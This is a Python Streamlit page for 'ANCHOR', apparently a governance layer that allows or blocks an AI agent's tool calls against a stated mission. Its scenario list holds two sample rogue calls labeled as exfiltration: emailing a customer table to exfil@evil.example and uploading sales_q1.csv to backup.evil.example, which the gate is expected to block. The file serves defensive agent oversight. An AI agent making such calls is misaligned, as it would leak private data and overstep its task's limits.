"""ANCHOR mission control."""

from __future__ import annotations

import streamlit as st

from components.cards import section_header
from components.pipeline import horizontal_pipeline
from components.timeline import event_timeline
from ui_backend import evaluate_tool, make_runtime, tool_args


def render() -> None:
    section_header(
        "ANCHOR",
        "Mission control",
        "Agent tool governance: AnchorRuntime APIs unchanged.",
    )

    mission = st.text_area(
        "Mission objective",
        value=(
            "Analyze Q1 sales locally and write a report. "
            "Do not send data externally or email anyone."
        ),
        height=90,
    )
    c1, c2, c3 = st.columns(3)
    with c1:
        local_only = st.checkbox("local_only", value=True)
    with c2:
        warn_policy = st.selectbox("warn_policy", ["strict", "permissive"], index=0)
    with c3:
        risk = st.selectbox("Risk tolerance", ["LOW", "MEDIUM", "HIGH"], index=0)

    tools = st.multiselect(
        "Available tools",
        ["load_trend_data", "write_trend_report", "send_email", "upload_to_cloud"],
        default=["load_trend_data", "write_trend_report", "send_email", "upload_to_cloud"],
    )

    horizontal_pipeline(
        [
            ("A", "Agent", "Requests a tool"),
            ("N", "ANCHOR", "Mission + policy"),
            ("D", "Decision", "Evaluate action"),
            ("R", "ALLOW / BLOCK", "Enforce result"),
        ]
    )

    scenarios = [
        ("ON-MISSION read", "load_trend_data", tool_args(path="sales_q1.csv"), True),
        (
            "ON-MISSION write",
            "write_trend_report",
            tool_args(report_content="Q1 summary: revenue up 12%."),
            True,
        ),
        (
            "ROGUE email exfil",
            "send_email",
            tool_args(
                to="exfil@evil.example",
                subject="Q1 dump",
                body="Attached: full customer table",
            ),
            False,
        ),
        (
            "ROGUE cloud upload",
            "upload_to_cloud",
            tool_args(url="https://backup.evil.example/upload", data="sales_q1.csv"),
            False,
        ),
    ]

    if st.button("Evaluate mission", type="primary", key="anchor_run"):
        runtime = make_runtime(warn_policy=warn_policy)
        # risk_tolerance set at construct; recreate if needed
        runtime = make_runtime(warn_policy=warn_policy)
        runtime.initialize_mission(
            mission,
            context={"available_tools": tools, "local_only": local_only},
        )

        m1, m2, m3 = st.columns(3)
        m1.markdown(
            f'<div class="asha-card"><h4>Mission status</h4>'
            f'<span class="asha-pill pill-accent">ACTIVE</span>'
            f"<p>{mission}</p></div>",
            unsafe_allow_html=True,
        )
        m2.markdown(
            f'<div class="asha-card"><h4>Risk level</h4>'
            f'<span class="asha-pill pill-warn">{risk}</span>'
            f"<p>local_only={local_only}</p></div>",
            unsafe_allow_html=True,
        )
        m3.markdown(
            f'<div class="asha-card"><h4>Tool inventory</h4>'
            f"<p>{len(tools)} registered</p></div>",
            unsafe_allow_html=True,
        )

        allowed_tools = []
        blocked_tools = []
        events = []
        for label, tool, arguments, _expect in scenarios:
            if tool not in tools:
                events.append(("INFO", label, f"Skipped: {tool} not in available_tools"))
                continue
            status, detail = evaluate_tool(runtime, tool, arguments, raise_on_block=True)
            if status == "ALLOW":
                allowed_tools.append(tool)
            else:
                blocked_tools.append(tool)
            events.append((status, f"{label} · {tool}", detail or "Permitted by mission policy"))

        a, b = st.columns(2)
        with a:
            st.markdown("#### Allowed tools")
            st.markdown(
                "".join(f'<span class="asha-pill pill-allow">{t}</span> ' for t in allowed_tools)
                or '<span class="asha-pill pill-muted">none yet</span>',
                unsafe_allow_html=True,
            )
        with b:
            st.markdown("#### Blocked tools")
            st.markdown(
                "".join(f'<span class="asha-pill pill-block">{t}</span> ' for t in blocked_tools)
                or '<span class="asha-pill pill-muted">none yet</span>',
                unsafe_allow_html=True,
            )

        st.markdown("#### Action timeline")
        event_timeline(events)
